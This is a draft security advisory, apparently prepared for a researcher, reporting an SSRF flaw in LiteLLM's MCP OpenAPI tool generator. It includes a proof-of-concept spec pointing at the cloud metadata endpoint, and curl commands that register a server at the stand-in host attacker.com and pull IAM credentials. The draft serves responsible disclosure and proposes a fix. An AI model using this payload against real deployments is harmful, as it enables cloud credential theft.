# LiteLLM Vulnerability #8 - GitHub Issue Draft
**Status**: DRAFT - 待用户确认后提交
**Target**: https://github.com/BerriAI/litellm (Security Advisory or Issue)
**Author**: Guigui Wang (GitHub: Correctover)
**CVSS**: 8.2 (HIGH)

---

## Title
[Security] MCP OpenAPI Tool Generator - SSRF via Unvalidated base_url in Tool Execution

---

## Body

### Summary

The MCP OpenAPI-to-tool generator in LiteLLM validates the spec URL for SSRF when loading the OpenAPI specification, but **does not validate the `base_url` extracted from the spec** when executing generated tool functions. This allows an attacker to craft a malicious OpenAPI spec that redirects tool execution requests to internal services (cloud metadata, internal APIs, etc.).

### Affected Component

- **File**: `litellm/proxy/_experimental/mcp_server/openapi_to_mcp_generator.py`
- **Function**: `create_tool_function()` → inner `tool_function()`
- **Lines**: ~200-280 (tool execution path)

### Vulnerability Details

The code flow is:

1. `load_openapi_spec_async()` loads spec from URL → uses `async_safe_get` with SSRF protection ✅
2. `get_base_url()` extracts `servers[0].url` from the spec → **no validation** ❌
3. `create_tool_function()` hardcodes `base_url` into the tool closure
4. When the tool is called, `client.get/post/put/delete/patch(url)` sends requests to the unvalidated `base_url` → **no SSRF protection** ❌

```python
# Simplified vulnerable code path
async def tool_function(**kwargs):
    url = base_url + path  # base_url from spec, NEVER validated
    client = get_async_httpx_client(...)
    response = await client.get(url, ...)  # Direct request, no SSRF check
    return response.text
```

The security boundary is broken: the spec loading path is protected, but the tool execution path is not. An attacker who controls the OpenAPI spec URL controls where tool requests are sent.

### Impact

- **Cloud environments**: Attacker can access cloud instance metadata (AWS 169.254.169.254, GCP metadata server, Azure IMDS) to steal IAM credentials
- **Internal network**: Attacker can scan and interact with internal services (databases, caches, admin panels)
- **Data exfiltration**: Responses from internal services are returned directly to the MCP client

**Attack scenario**:
1. Admin configures an MCPServer pointing to `https://attacker.com/spec.json`
2. The spec contains `"servers": [{"url": "http://169.254.169.254/latest/meta-data/"}]`
3. Any user who calls the generated MCP tools triggers requests to the metadata service
4. IAM credentials and instance metadata are returned to the attacker

### Steps to Reproduce

```bash
# 1. Host a malicious OpenAPI spec
# spec.json:
{
  "openapi": "3.0.0",
  "info": {"title": "SSRF PoC", "version": "1.0"},
  "servers": [{"url": "http://169.254.169.254/latest/meta-data/"}],
  "paths": {
    "/iam/security-credentials/": {
      "get": {
        "operationId": "get_iam_creds",
        "responses": {"200": {"description": "OK"}}
      }
    }
  }
}

# 2. Admin registers the MCPServer
curl -X POST "http://localhost:4000/v1/mcp/server" \
  -H "Authorization: Bearer $ADMIN_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "server_name": "malicious_server",
    "url": "https://attacker.com/spec.json",
    "auth_type": "none"
  }'

# 3. Any user calls the generated tool
curl -X POST "http://localhost:4000/mcp-rest/tools/call" \
  -H "Authorization: Bearer $USER_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "tool_name": "malicious_server_get_iam_creds",
    "arguments": {}
  }'
# Response contains AWS IAM temporary credentials
```

### Suggested Fix

Apply the same SSRF validation used in `load_openapi_spec_async` to the tool execution path:

```python
from litellm.litellm_core_utils.url_utils import validate_url

async def tool_function(**kwargs):
    url = base_url + path
    # Add SSRF validation
    validated_url, _ = validate_url(url)
    response = await client.get(validated_url, ...)
    return response.text
```

Additionally, `get_base_url()` should validate the extracted URL before it enters the closure.

### Environment

- LiteLLM version: latest main branch
- Python version: 3.11+
- Tested on: Linux

### Severity

**CVSS 3.1**: 8.2 (HIGH) — AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:N/A:N

Requires admin to configure the MCPServer, but once configured, any user can trigger the SSRF. In multi-tenant environments, this is a realistic attack vector.

---

## Notes for User

1. **提交方式**: 建议通过 GitHub Security Advisory (Private) 提交，而非公开Issue
   - 链接: https://github.com/BerriAI/litellm/security/advisories/new
2. **与已提交漏洞的关系**: 之前已提交 GHSA-g8hw-w2cf-jg6j (Guardrail SSRF, CVSS 8.6)，这是不同的漏洞（MCP OpenAPI Tool SSRF），但根因相同（SSRF防护未覆盖所有HTTP请求路径）
3. **这是v2审计报告中的漏洞8**
4. **署名**: Guigui Wang / GitHub: Correctover
